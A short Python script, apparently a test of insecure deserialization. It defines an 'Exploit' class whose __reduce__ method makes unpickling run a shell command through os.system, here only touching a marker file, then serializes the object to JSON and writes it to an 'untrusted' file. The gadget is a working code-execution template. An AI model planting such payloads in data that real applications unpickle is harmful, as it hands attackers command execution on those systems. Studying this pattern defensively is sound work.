import pickle
import os
import json

class Exploit(object):
    def __reduce__(object):
        command = 'touch JSON-EXPLOIT-EXECUTED'
        return(os.system, (command,))



def convert_to_dict(obj):
    return obj.__dict__
    #obj_dict = {
    #        "__class__":obj.__class__.__name__,
    #        "__module__":obj.__module__
    #        }
    #obj_dict.update(obj.__dict__)
    #return obj_dict
print(Exploit())
data = convert_to_dict(Exploit())
print(data)
serialized = json.dumps(data)
filename = 'json-serialized.untrusted'

with open(filename, 'w') as file_object:
    file_object.write(serialized)

